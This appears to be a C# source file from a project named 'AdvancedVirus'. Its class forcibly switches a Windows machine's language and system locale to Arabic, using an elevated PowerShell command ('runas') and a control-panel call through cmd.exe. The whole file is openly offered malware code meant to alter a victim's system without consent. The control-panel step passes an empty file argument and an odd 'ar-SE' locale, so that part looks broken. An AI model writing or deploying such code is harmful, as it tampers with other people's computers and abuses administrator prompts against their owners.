using System;
using System.Diagnostics;

namespace AdvancedVirus
{
    public class SystemLocaleChanger
    {
        public void ChangeToArabic()
        {
            ChangeLanguageWithPowerShell();
            ChangeLanguageWithControlPanel();
        }

        private void ChangeLanguageWithPowerShell()
        {
            string powerShellCommand = @"
                Set-WinUserLanguageList -LanguageList ar-SA -Force
                Set-WinUILanguageOverride -Language ar-SA
                Set-WinSystemLocale ar-SA
            ";

            ProcessStartInfo processInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = "-Command \"" + powerShellCommand + "\"",
                Verb = "runas",
                UseShellExecute = true
            };

            try
            {
                Process.Start(processInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"PowerShell language change error: {ex.Message}");
            }
        }

        private void ChangeLanguageWithControlPanel()
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = $"/c control.exe intl.cpl,, /f:\"\" /l:ar-SE";
            process.StartInfo = startInfo;

            try
            {
                process.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Control panel language change error: {ex.Message}");
            }
        }
    }
}